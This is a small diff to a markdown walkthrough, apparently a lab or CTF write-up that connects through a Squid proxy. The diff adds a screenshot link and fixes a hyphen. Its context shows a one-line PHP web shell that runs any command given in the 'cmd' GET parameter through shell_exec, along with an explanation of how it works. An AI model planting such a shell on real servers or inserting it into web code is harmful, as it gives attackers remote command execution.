@@ -63,4 +63,5 @@ Let’s use the extension to connect to the Squid http proxy by entering in the 
   ```php
   <?php if (isset($_GET['cmd'])) { print(shell_exec($_GET['cmd'])); }
   ```
-- In this PHP script, we set a function which checks if a variable is specified and not ‘NULL’ in a HTTP-GET request. Then the ‘shell_exec’ function will execute commands via a shell, after a variable is specified (cmd); commands are positioned after cmd=. The php script executes and displays the results on the web page.
+- In this PHP script, we set a function which checks if a variable is specified and not ‘NULL’ in a HTTP GET request. Then the ‘shell_exec’ function will execute commands via a shell, after a variable is specified (cmd); commands are positioned after cmd=. The php script executes and displays the results on the web page.
+  ![img](https://i.ibb.co/BV2MZ3b/Screenshot-2.png)
